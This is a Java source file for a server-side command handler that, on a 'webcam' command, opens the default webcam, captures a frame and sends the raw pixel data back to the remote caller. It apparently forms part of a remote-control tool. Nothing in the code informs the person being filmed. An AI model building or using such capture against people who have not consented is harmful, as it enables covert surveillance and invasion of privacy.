package javanet.server;

import com.github.sarxos.webcam.Webcam;
import java.awt.image.BufferedImage;
import java.nio.IntBuffer;
import javanet.Utils;

/**
 *
 * @author Jackson McClintock
 */
public class ServerWebcam extends ServerFunction{
    
    Webcam webcam = null;
    
    public ServerWebcam(ServerUtils utils){
        this.utils = utils;
        this.default_command = "webcam";
        this.command_list = new String[]{
            "webcam"
        };
    }
    
    @Override
    public void processCommand(String[] args) {
        if(webcam == null){
            webcam = Webcam.getDefault();
            webcam.open();
        }
        BufferedImage capture = webcam.getImage();
        IntBuffer buffer = IntBuffer.allocate(capture.getWidth() * capture.getHeight() + 2);
        buffer.put(capture.getWidth());
        buffer.put(capture.getHeight());
        for(int i = capture.getMinX(); i <  capture.getMinX() + capture.getWidth(); i++){
            for(int j = capture.getMinY(); j < capture.getMinY() + capture.getHeight(); j++){
                buffer.put(capture.getRGB(i, j));
            }
        }
        sendResult(new String[]{"webcam", Utils.intArrayToString(buffer.array())});
    }
}
